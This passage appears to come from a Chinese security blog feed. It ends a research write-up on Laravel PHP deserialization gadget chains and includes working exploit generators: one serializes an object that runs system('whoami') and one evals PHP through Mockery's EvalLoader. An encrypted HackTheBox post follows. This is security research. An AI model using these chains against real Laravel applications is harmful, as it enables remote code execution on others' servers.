php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $parent, $route)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($format)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $format;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">fs</span> = <span class="title">array</span>("<span class="title">addCollection</span>"=&gt;"<span class="title">system</span>");</span><br><span class="line">    $gen = <span class="keyword">new</span> Faker\Generator($fs);</span><br><span class="line">    $pb = <span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($gen,<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="keyword">echo</span>(urlencode(serialize($pb)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不需要在意<code>ImportConfigurator</code>原本构造函数中继承和定死的类型。因为是直接进行链式调用。</p><h3 id="popchain3"><a href="#popchain3" class="headerlink" title="popchain3"></a>popchain3</h3><p>回到开始。我们说除了用__call打组合拳。还可以找有用的全局找存在dispatch方法。<br>比如src\Illuminate\Bus\Dispatcher.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>首先if判断里调用<code>commandShouldBeQueued</code>。然后调用<code>dispatchToQueue</code>.<br>可以看到。<code>$command</code>只要是实现ShouldQueue接口的类即可进入下面,存在call_user_func的命令调用。</p><p>现在可以调用任意类的任意方法。那就只需要找一个可用类即可。比如EvalLoader<br>。其load方法含有eval语句.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到只要保证<code>$this-&gt;config</code>的类存在getName方法。就可以跳过return执行eval.这里选择PhpParser\Node\Scalar\MagicConst\Line类</p><p>exp3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, $code)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    $mockdefinition = <span class="keyword">new</span> Mockery\Generator\MockDefinition($line,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">    $evalloader = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $dispatcher = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($evalloader,<span class="string">'load'</span>));</span><br><span class="line">    $queuedcommand = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($mockdefinition);</span><br><span class="line">    $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingbroadcast));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/17/Laravel-popchain/5.PNG" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>沒想到一个下午能把laravel主要的两个版本反序列化跟完。还是收获挺大的。不过实战中想遇到laravel反序列化比较困难。使用phar来进行触发应该是比较理想的可能方式。到此php反序列化就告一段落了吧。剩下的假期就复习之余抽空看java了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Unbalanced</title>
      <link href="2020/08/15/hackthebox-Unbalanced/"/>
      <url>2020/08/15/hackthebox-Unbalanced/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">请输入root hash 6H***Yw1，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="39df9853a3087e6b7763f18d93a5ab38e4bcd9c746eadc11571787ed6a53b650">6e3bf2013272ad657b50a2f87081881f9bbeb984a37cfdded40f2cdce2eddc643aff135031d8f3594b872a1448ddae59c454cc1e9e1c50ec748205c03396235b4b7397e7076e3836223451ee05c29bfada2967006b9b1ab640b6798fb997db14e79440ee56f691a8373d5a0ae04333d6d3822b007dd079569c1399eb93d569df8008707177d477a61b05a4ef3246af1500c2f6e1d6d80c6cb0bebb69457a52bf6e3a591c02acc89a7b901e3119a16fa1f65ff5a684c772e203057edd78c7131184ab9ca61396d32a8442217baad42119f0b4643b70a6b95d3e1e2f758ba03608fc58647a00dcd66e95e5f87d35caeb50196e6aa84e91251f9043c7ed1f84195f6314cc4929f781ff12bced2959caaaad5eed058ba823a63bcfe4c1b41815e21d92bdf116e4f5d894404fc4f2230f566d018404d69b66e4b2b6b697df9d33b79f88bdfdecce799ff2602ad96cb2adc37b995d1a07ac898597ce933fee9d040b0beba2cbd863117958fbb5880781a0f6be4360b3b150a10a594249beb1058b1ede206c08609036843ec04434f8226687843758bb89e69e2c717365aefdf00780d35a415942231756bf015e93d3583ebc8277374bd1257539d5e6118e7af3a2cfe81e4b07582e8c830bbf779348f1fc69954ffcacf75e7750fcfd1539da6ec44d5d02c17c74dff6c97335a81880a3bb19540d1f74ec84628d102965740b27b1234d36878ac67f30dd768a5c64123608f2949a0f3f3ade1ceeb7a4ba2cd6bf1d6a3cc152cff35f9cd2f5d3f032ada8bfa8a65dba13551297e6cf9ac451c774d6880b1999b115f7694581a57d31b3e2b7c16f323471bbd8b57e438c11831ed6ebc3f5dc27085a523115ad5bc6809a886cebfc1ed53b901001ff319d367a762503b80efc05510aa864cd4e57afa78f986878f9a13c5330d5a1689c490b4c434f49d72518370075569ca15a0e2f78810313930a0c70c69850cd385177427226e44722c8c52e1044371c3e0750953c323265200b5f3c95c45391ae7fb72bf882a9180e1a033854fbbfb37dc48d95cafe32c37db2c825a19e1692b5e3509c0d40cbb7a1d91906f78f43cdb59fc3121ea34ef29eb9def816ec8964826fffe0864f3bf3fb2bbfdc29acc26e18a6c6d990c0ae6edd3741a87ddabe749ada554505af0c5a9f6fd68b474cd388b2df29fec204453fd65c9b4a7307f4ef460a771617ddc316a99cac33333149a2c2e0ab18e65bea692542d8f9045a25e85c2012d39a337053c29bb834d90a1e8d9b1bc645aaf7e0bccd0fd7419da72bd7c6f47d55008757697655867c83307b01dd4f647af8db93a813762a40802757def40c678854e2ed1320f02e65cd12eef6328be66141e82acf5726e066a79b23d18f1c3f29f654285fd1687d530476a9b0e6c5dba579f9c13612ab6369b3fe71f150d3969046fd30bb7202921d987bfaa637fb9e19a49fb17fd92240ccc5d1e9f2adbcb71d34ba8a92db216c8474db77b89df5aff0e6af41d9d7b79fd1315dc3eae976d30f3a1e6b5aa14e553519178771da5eb85566f290a457d84ff310ca563e17ed39d755cde1d8a0ffb21d662dd16b5d62e66ae4fa8cf2b54d183450a1c85a18a7c5b74105b5d06a6d6eed76720ebe1cf925699d1bae7bf7ba0c2ba997d66670b5e533b9c063176ae4165a3ec4d7ec00f49168d31623cd651ba7626e5830348d0ba6e0d60cb11aa93c2899bcbb4bffecb43936931eb7cc5ae9e1f7302c1af404427f0f2afc1276efd2978ba9b69ab5dc1930405c687c419c25e152378b8cb9c205c44196d8dfd7207bb06b1f4ed2be03cfa6ec539817889e8409501d26e5848e91c1297452cb78360e98806cc13580444dface03e226bee1f0f030ee65f574961378be709dd3eb9367fd8c4cc1b48099795007d8103b58b022b4d74017afb582cffb3853895969457f3bc9842b2c596a4e694bf4deea3804394a99516d50da08abb0ef1a18212f00426c79e85ca25417560ffdb9984156f459cebb77eebe025a73bcd7f5fe611bfab4f6714c6c7168cb3b8430381c247a99e04acad24673d25cb421c65a199640f22b853e3cde2700121bc7f2fca9e6a90ee6a39c7d983a8d010dcf4f83381cef648fc242d10bef25e12a6c39ff8d0c01aa612b8485b3b0083baee1635a22f5c57daece3cc3d041160762a27adec157f48001acef746e2cd8674d785857b00d2113fe03b239d16489ff89ae3a467ad0880e8eba5f1b5bc980c034f11ee5d58ce3f4d84aa7aa19e53dea6b17510e29ef33e6e39a32992fd06b03c28aaa48a21102238caf088fa5fb2b2f44a29c76d383bc81d27ff3b8c3302be616902e273da0c3edb20006660b4b4699db84ee5a7f5ceb53a93c920ea5be23a45314aacb4e1e3a0ac854e5c880729d16db1587b9c25292343c6bedcd25aa30c9ca5d3f3a126178ba4bf8a99f30b1fd5269fabcd4f1d6b7f01b47330079ca7f55add1582b681e52675528f9b6a9b0c886ba7a4222aefdcaed11a753a8eafd67b999fb4652a201529c8aa5a97e65342f2ab03bcf6e04f4343de126c0126d898516662ac87fd8964daa7eea2b859fbbeaf3ee93d134d41d75b85193adc3e3908d1e2bce64f572afad7a43f74c835af4997ddd4ff00172d1c7429412f351d76a72b547a3d9d8dd612da7a5fee70687923c6a2cf6148c0da43f0d45fb98f95788079a97652fb79b37a4dcacb798f2a3f7c69a49443c4f767b1e77c00c1f0a554de1b6282adac684a4f9b76f86c1a56e020417bf424d7bd15a313e6e1bb6c5fddf4a18d07f69416bfca71c31fd33d8581220fd265a39cfa84ff462b62e35c014e69023df0a4e2e459c9844e183c22a2a17c27592e20c1c0a3d604b705853f70f7c2f2e7891e23bb12996145c891c7c3af3f3322733200573aa7564f416e55d833ede23a6a6c7dff7ed4b12625e6664e3241df15345a71caddb79ece6da195a5a92a90df2d0b5773e8de3c7f0b49db9abeb1ede29b6dff1229d24f701ff2bd1aab693b8e1bdb37d8a4de5f0148fcdbf88a49e5fd03871eabce2627ed9852870f4703c603fa3a07e46fb500f9f7d1af0baa1e06bd134514c931421e6a5e2584188e6282d7b6b63a70bc7a1a16825327003e2282732783542c1c23a8c35f9170e0c665a7c28414866e20baec2fcb0f874e9a6b62ea2030ee81c916a5ab6e1f5916c3290c21d15c538b6259fcb0d8766f6ab633700e22e591976791f76f9810ea10d85eeeaf57ea677f3d8c99049adae8217d7c44db65432e35c7dbb28f9b555596b42fe584c3af69d5452325f83f79bd34365e2e794e45b5b59127678edbcd6ccdfdf82fef1528322d05b4f107210a802dc1485e719135c921a1c32cd4bd9fa794c6be8cc8f1ae9a5b90bea2f4755b7e89c801e7937dcf6684e36680d12d1aedb6f57efd5eb85732ea19fcba65c46a5f454638970bb7e53b07c6328340acfbe1f5ebd5a6e502937c6e7212cef6c42d0afcc4765acfb8d2fc79329cf24e0de52c519ab1a296f5e58d08cfbf7d863a39363784219d96c51ae3b89580d67e24e613ecda67ec039b83eb89757677f5073982eb66654cda6379e6f405233b40e99109a722bab49f9939af6bf4711c19cbfbb0860e14a653716fc88c4041d8be8f6aa4c25f0e8413226bd4867850d3f3073c4d7289f63994ba5e30d9b19262cf18a6ee29fa0a5f5bf211d15f5b45d2c530ca96d04ab9ad78c8a155df0ad183e0f7865be2837e5843008d482dd6f0aa9fd6583e6955d1f27a997b92fecb89dcd16a026b4ef0ffa016a8a6f788d3b4d2a27b38c714283442427cf27037d754c1c5c227f8d414128d267cfb16b18dedf7714446f732cef4816cfcfd43069982e4e343ad0c99110466d82852400abf5ebbf2fe5c5115bb9fe5479b6df2765f4a22b4473f83d76ed88affaaf19abed73252eddbc6a03adbe9f44919f6658fadb7535b6be850c7b5e649daab8fb04731e5315dbc389f2fde99433d5087c669de45aca08116c72ef32b0d588b56db0ddc11773d3625e00f5d9c781023aff004b4b4367d0beb62a5b160ac75a6f747dd347b67435cd038831fb1e4650402a3dfd3f3f409c1ba58e50355994c9882774583d9a538d1ce03fdf57de537155ee5ee2f77a64ab7073474bb8cb4edc93f74a0d4c14fdbf724d4dbbdcd0fb08edccdd66ee1e70f8b9f78c42d7b63b6111a231a1e441fa27b52da0be950a10281895ab1185cd81e854b88b63760f2e68571f4ec88a5d4444ee0de6735e0ea0cf9e35e5cba2c15e7a5420badda4f04ebd311e2c27950c89bc7f3e61c6976fbefaa3cf3b0706aa51a38e61b3323d03b7ec8a50682f492d82a0f2ac78cb15ce4301c4e200dd616169f8a58d774572eb3fa4403fc03781921a4097d4f696cb89324dfae1a422d164c2e192b4daa0df3efeaf4029497b6062967f3b8865c8f96400e9520895a205386b63faa147b30cd1cbf861300511861129d722bbb211f71def43a1babb0eac44a9ba6997ac8926791a2c6f974fb0676cfa7de637560cc9e7feab3adfb37624fae742d95bd8abd05e338f89b67b7a31d5cf4194eec1d6b93d4d792c786c6ac6f7e05a2cf1fbdf712f1462779b695ae0f33a8f5e4efb98ff0e19dcacca17cc08299ebe4e64a88880300dcb576f89508fb30e0963ff9f6639a0028b8ac666b1739f9d835ed8649a93f48aa31d0a2f52f471db2d89e0fd36fd800672cff904d9df347fc1e886af6915123e71344f997caafcf6a69455713085b76b59c06f112fd370d36a81133106e64a36f7335ab374ffa787c6a4f897f317130eead3291309cd5f8838d7298728cd8dc4e14dbcf052390f9d2b507892317055876500222bbf70b44b176e51cd523c333ffc3a8dd26984ddb959d06cf8bb4089dea7874333d0eff71b61f43ae77d5d38a32b2e2542dd813e158de6a9fd6b697fe57f899ac7273bb00ddfbe4191cd98ec351a1dd1c3cd461afb665cc9f3995e40e076bd9d9f026becc431426c5a581ebef497f626df037659a01b0f34eb0aca6117a5fa1d18146a02ffc9770a804f864b7be92155987b73ebc242ee1f5092b43626bceceefe013dc60bf5949424768d9af7b875c0dd9446833952aa70a46ee3c7183b3bcd2bd3c65efc096c27aaa6a03ee980ade2708ef02d80c139a8814cbe43cff34292e0f9af2ca4e8fa01e1da07fd080036125f4250186e62334adecacae03cd63425719b11ef78f1f54e6f718d8c2992d17df5172a18e54bd1b28ae63fe187bee719d1384e9ecdb51ebd6762a60c4cee8f5649d5f3995c517ab5d360cc43279ab7df2c4709ab5a86f5af3db2107118200d19ee3f569a4a8cfe8751cb1b887e62c686fca54ebbb1e678eaaafd6a926eeb1d1bcbb4ad5535c04371410f6e1cc54dafd2a8018804c77f7b810fe59f2f6138868d286eaee69420e5ae6b59429c5bd45cbf4632d064fc9303d4d68d618b423903ba42374049f6922f18912708a0cc4a779be4f218d7a68714976075a45ed23c7336bffea018199bd6d1c0d75d7f1b10804e3c2a1d40b495b46a0ab5a9726cb6432e2aa9e0665904f9c18f85baea0f8e23387edec5acf2b7accbb8f5509b8b0d2dc6c04876b92f2ffab899b1a4880702799392f9fc870704088dedbdf24da36e790b3b8785e98b29f8542a565bd6c7166c1ed51393d17d9d4fdc061eb1b28caec86052398423052ffc4d5a9b2c7f8d8513d6ac6d6af26e202a73c189f1920deee270ee021afd38f525941bc1e506d8e0af77be36a535c4516c5e4f51839a9d4f7b9b148df2a9ec38ccc1b2c4a62b972d9790e0efe26f43aaf92a4d765d8ac950f4a6853125aa2bf70f89153be533ca47b637b7245c94d35e459e7c22ddd7fb20404ddb8b082e0d34b8d8d30b66769a06393c6ed649cc765aedaeadfe683e7fe9a5136dda5f87f5fbd5e4eb005fb067650eb3b18adb1034b7e94c77cb2a041a5f8e45ac89756c2a80aee672499bb1dd385f2c1eacb869e669c03ff20f8fcf6e7745189cffed756683331cc61c9a1dfee52a03f70895c95b5ea8593a3ca62e8af38e2afbe6c73f039d721841b46ed6bc17f0e999229e29cd1f858fc662282b417ee88c16126394a73b07671ca5ba4307b548f39972e083a0d080b29e102d88773768e91b66c5112fe6ba4c70cf9a69865a8663bab99298ded600315b5ec1f2dd271c065f5e55f86feedab3ab2c14650ac4982117a48f2134e4c19cbe163eee1f0820d151684cb7515c2f6252de9c53fc251eaa40a29a12536db8769c49346139cd563050825a269b7b3e7d82d2dd817374047f80767f7f81eb05717bd809ad1e32ee0224939068651adb2619bc5ae07444add35a3b605f2d2626305910320125543049577091e7fc5020b13de74457655d1d0bbe9b0ec156d5fb3da8da7c5d5ae28db7de20b6134c46e78b51e3de52328c766e45a9939ebfe41710c96dd3cd1d53ef78cff74e93d223c9b076ac45656e609315478e75840ea626c56da60f6c5af36c425b4c0b8f0b6f58be3bc96168eb9777250eae7f320c43d1189577924ea52ba4212452fefbc34b162a07862902dc69cc7a1b2c25b91201650b462da6833a8f1da89cfad2e54b044a5f9207e4d94abf5cf54cb112fa01d05e60250ce5bdb2da9443d06bfddffa2547ea83343b15883696cdb11e51f4803061cee71d591305fa2eaa775e9a6fe6c8bbf43ae315349aa690cde712464bca430c35f7b39da87029d49a84efaa79232d88767b7abd0ca3ef7ed827d2a4d1416a9617af421917d9e6f0472797da5d016769851eaf485ead228e33f3e5f6a8dfe61619da76a14351b42e2fa32904b6c7fcf44779b335c0f70e845c6b2f4b7776e19c55d5643fb7bd6732ee19dcc5cb99ec6fe084f0bb6941bc832be8cc75183185de59d8d81df38ec13b83d1a879033c95a3a83b708442908a4c0a9eb851b3b5e2edbb03a0cd87837f333b4d9b3d5d96285314e5a630e590dbd8a3e1e4b07465413ebd9c95030df7383f29680d1859ac6ac49649626bb0c319441b84221cefb4fae59706abd52e47146458e92b6996d1ce0ef880a05a3073e0a2200a1e7d3fd445d8b1095024ca59c04c67e589d482d576daba497516732ee576cde00d4565324cb0265102f95d6eb9f33bc5931479050f7b9a193ab2cc9ddfcd0de25eb52fd3f3b4a535649aed2960da27bcdc31338ebceb58ac681df8b3cf5c5e20e8721acb68133d087bc45592fbffecbd103e1697a3bfc2dfecc21979bacc969d056eecdafe1f4f686b8a0382f2473bc5ce462a10bd70c1327603ee1c7f699f78bdb01e75343bb5b2d18787bbb4f1e6fef62f819da9cdfe6cbec39d0ab99bd77ac10332c369b8b6d86e34a15f6bfdd2539856b1db9b99fd2c16781904079585cf3d8251ebbdd819a18da5aaffd21fb7fb2ddc9345ceea5f8b96af2b087f485e3e6869f73dc883e95c862a68bb83e5630a99bac2746129b44626efb3bd7999edc1fdbd1133485af2f8419945e83af3a00631f63e8afac524063211b18a88ba8699f15f979bb09324f94fac280b39cda05ce52bbb0512d4e88f6c945769376c9cc848cdaf1d6d28c50b5bddb611bb383c84494f80b198e099d3a9e28a94d8ae16cd2b1f3524e84ca8603579f1d90cdb3e4f095b38417affeb7025d0f0269c7242d54465c5d0a9516394d1e62559dfc335628d60e8a18af43df23e9c37ebcbf410a8330be620d5f61f1d532646b448ff9eea86613c7569eaaf2a9c88c95a08cade4c1f1f9f67023ce2cae7e6feb1c3db4bc7408be179b332c634172a171e89167ee721a97e384e442356d8c43271707d0318419a035881ced442d5ed58aabe4bc1c0f71d8a43c07c7c38bf3e4dfaeb0d3e00105b8582af9394124e12ae893566146b8df84abcc32fee8c01f389a9d88ca11e16c3279b234c2cf0e1478e70b1acbadbd765c7e59b2f9a82a3de847c48bf337521c074793615d1fc6e3c87f92454acd237787d8c6b5cc997f9ada3cc4e872dca462643f45c3c26c1f9cbd45d26248539df784940aea91673b6091e2042d53cfcba4f28fa56b7a2e073195c20d8dab6adef35f743df044411031e973f63d5fe1c2d028e626dbfc9069e15f037c41ea8b0dbbe90f60df0cd0c0cd87f734ef0ed6577a4c770b8e65af0514a96034ef144562f13bb00437f6cdb569d48584221b9a4767378bdd4ad23e896f7354093c7d0632070d32bd246c1a54b836a7d41f6ca2aeffe30a5f5d5208ca33f875b61177c36cd5cf3032d3c0d165bd5c4926d5fc756fcee24fdb6e2ada378d5560b5eb4e5d0e7bed58af7b0a9a098e46bc0ce7c51ba4fd4880534b53384f4a7cc2bdebc8110921132c7a376c37aa818d89f3b41fb8286a8a5b65daca9e6abb2682efa31e8b0f3c616338b9655c6db4275d146e7f92a88839cd28d41da008322015c892d0cd8c253b9c